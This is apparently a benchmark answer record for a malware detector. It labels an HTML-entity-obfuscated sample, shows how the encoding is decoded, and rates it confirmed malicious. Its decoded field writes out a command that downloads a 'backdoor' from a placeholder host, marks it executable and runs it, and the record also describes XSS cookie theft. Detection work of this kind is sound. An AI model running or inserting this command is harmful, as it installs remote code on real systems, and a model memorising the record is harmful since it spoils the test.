@@ -1,0 +1,74 @@
+{
+  "sample_id": "adv-006-html-entities",
+  "test_type": "BENCHMARK_TEST_ONLY",
+  "primary_detection": {
+    "code": "ENCODE-006",
+    "name": "HTML Entity Encoding Obfuscation",
+    "description": "Detected HTML entity encoding used to hide malicious script and command injection",
+    "confidence": 0.90
+  },
+  "decoded_payload": {
+    "html_entities": [
+      {
+        "format": "decimal",
+        "encoded": "&#60;script&#62;",
+        "decoded": "<script>"
+      },
+      {
+        "format": "decimal",
+        "encoded": "&#105;&#109;&#112;&#111;&#114;&#116;",
+        "decoded": "import"
+      },
+      {
+        "format": "hexadecimal",
+        "encoded": "&#x69;&#x6d;&#x70;&#x6f;&#x72;&#x74;",
+        "decoded": "import"
+      },
+      {
+        "format": "named",
+        "encoded": "&sol;&sol;",
+        "decoded": "//"
+      }
+    ],
+    "full_decoded_command": "import os; os.system('wget https://[REDACTED].example.com/backdoor -O /tmp/bd; chmod +x /tmp/bd; /tmp/bd')"
+  },
+  "underlying_threats": [
+    {
+      "code": "XSS-001",
+      "name": "Cross-Site Scripting",
+      "description": "HTML entity encoded script tags for XSS payload delivery",
+      "confidence": 0.95
+    },
+    {
+      "code": "EXEC-002",
+      "name": "Backdoor Installation",
+      "description": "Downloads, makes executable, and runs backdoor from /tmp",
+      "confidence": 0.97
+    },
+    {
+      "code": "COOKIE-001",
+      "name": "Cookie Theft",
+      "description": "Exfiltrates document.cookie via fetch to external server",
+      "confidence": 0.93
+    }
+  ],
+  "obfuscation_technique": {
+    "type": "html_entities",
+    "variants": [
+      "Decimal entities (&#NNN;)",
+      "Hexadecimal entities (&#xHH;)",
+      "Named entities (&name;)"
+    ],
+    "layers": 1,
+    "decode_method": "html.unescape() or browser HTML parser"
+  },
+  "html_entity_types": {
+    "decimal": "&#105; = 'i'",
+    "hexadecimal": "&#x69; = 'i'",
+    "named": "&lt; = '<', &sol; = '/'"
+  },
+  "risk_score": 9.2,
+  "verdict": "确认恶意",
+  "verdict_english": "Confirmed Malicious",
+  "reasoning": "HTML entity encoding used across multiple formats (decimal, hex, named) to obfuscate malicious scripts. Decoded payloads include XSS attacks for cookie theft and server-side command injection for backdoor installation."
+}
